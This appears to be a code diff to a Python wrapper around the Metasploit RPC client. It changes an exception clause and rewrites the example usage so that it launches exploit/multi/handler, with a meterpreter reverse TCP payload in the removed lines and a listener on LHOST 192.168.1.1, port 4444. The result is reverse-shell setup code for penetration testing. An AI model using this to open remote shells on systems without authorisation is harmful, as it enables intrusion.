@@ -123,7 +123,7 @@ class MetasploitClient:
                 session = self.client.sessions.session(session_id)
                 result = session.run_with_output(command)
                 return True, result
-        except Exception as e:
+            except Exception as e:
                 return False, f"Error interacting with session: {str(e)}"
 
     def close(self):
@@ -139,10 +139,9 @@ class MetasploitClient:
 if __name__ == "__main__":
     msf = MetasploitClient()
     if msf.connect():
-        result = msf.run_exploit(
-            target="192.168.1.100",
-            exploit="exploit/multi/handler",
-            payload="payload/python/meterpreter/reverse_tcp",
+        success, result = msf.execute_module(
+            module_type="exploit",
+            module_name="exploit/multi/handler",
             options={'LHOST': '192.168.1.1', 'LPORT': '4444'}
         )
-        print(result)
+        print(f"Success: {success}, Result: {result}")
